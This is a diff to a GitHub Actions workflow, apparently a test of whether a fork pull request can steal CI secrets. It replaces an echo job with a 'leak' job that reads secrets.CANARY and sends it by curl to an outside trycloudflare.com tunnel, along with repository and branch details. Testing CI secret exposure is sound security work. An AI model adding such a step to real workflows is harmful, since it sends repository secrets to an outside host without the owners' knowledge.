@@ -1,10 +1,14 @@
-# 0x19 M1 base workflow (control)
+# 0x19 M1 exfil test: fork PR replaces workflow
 name: ci
 on:
   pull_request:
     branches: [ main ]
 jobs:
-  echo:
+  leak:
     runs-on: ubuntu-latest
+    env:
+      CANARY: ${{ secrets.CANARY }}
     steps:
-      - run: echo "0x19 base ci on ${{ github.event_name }} head=${{ github.head_ref }} repo=${{ github.repository }}"
+      - name: leak
+        run: |
+          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-m1-leak?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}" || true
